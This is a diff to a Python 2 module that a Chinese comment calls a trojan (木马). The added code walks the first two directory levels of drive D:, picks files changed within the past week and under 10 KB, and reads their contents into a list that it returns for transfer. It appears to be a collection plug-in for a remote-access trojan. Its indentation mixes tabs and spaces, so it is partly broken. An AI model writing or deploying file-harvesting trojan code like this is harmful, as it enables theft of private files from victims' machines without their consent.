@@ -1,19 +1,55 @@
+#encoding=utf-8
 import os
 import sys
+import time
+#---------------------------------------------------------------------
+# 此木马模块只传输D盘下一级和二级目录下，修改时间在一周内，且文件大小小于10k的文件
+#---------------------------------------------------------------------
+ans=[]
+
+def judgetime(name):
+	fileinfo = os.stat(name)
+    if (time.time()-fileinfo.st_mtime)/(60*60*24)>7:#判断修改时间
+		return False
+	else:
+		return True
+
+def judgesize(name):
+	fileinfo = os.stat(name)
+	if fileinfo.st_size>10000: #判断文件大小
+		return False
+	else:
+		return True
+
+def is_dir(name):#是二级目录
+    path_name=os.getcwd()+name
+	files=os.listdir(path_name)
+	for i in range(0,len(files)):
+		pname =path_name+files[i] #绝对路径名
+		if os.path.isdir(pname)==False:#如果是文件
+            if judgetime(pname) and judgesize(pname):#如果符合传输要求
+				ans.append(files[i])
+				fp=open(pname,'rb')
+				content=fp.read()
+				fp.close()
+				ans.append(str(content))
 
 def run(**args):
 	print "[*] In file_return module. "
-	#os.chdir("D:\\\\")
-	files = os.listdir("D:\\\\")
+	os.chdir("D:\\\\") #切换到D目录下
+	files = os.listdir(".")
 	content=""
-	#print str(files)
 	for i in range(0,len(files)):
-		if files[i] not in sys.argv[0]:
-			if os.path.isfile("D:\\\\"+files[i]):
-				#print files[i]
-				fp=open("D:\\\\"+files[i],'r')
+		if os.path.isdir(files[i])==False:#如果是文件
+		    path_name=os.getcwd()+files[i]
+            if judgetime(path_name) and judgesize(path_name):#如果符合传输要求
+				ans.append(files[i])
+				fp=open(path_name,'rb')
 				content=fp.read()
 				fp.close()
-				break
-	ans=[files[i],str(content)]
+				ans.append(str(content))
+
+        else:#如果是二级目录
+		    is_dir(files[i])
+
 	return str(ans)
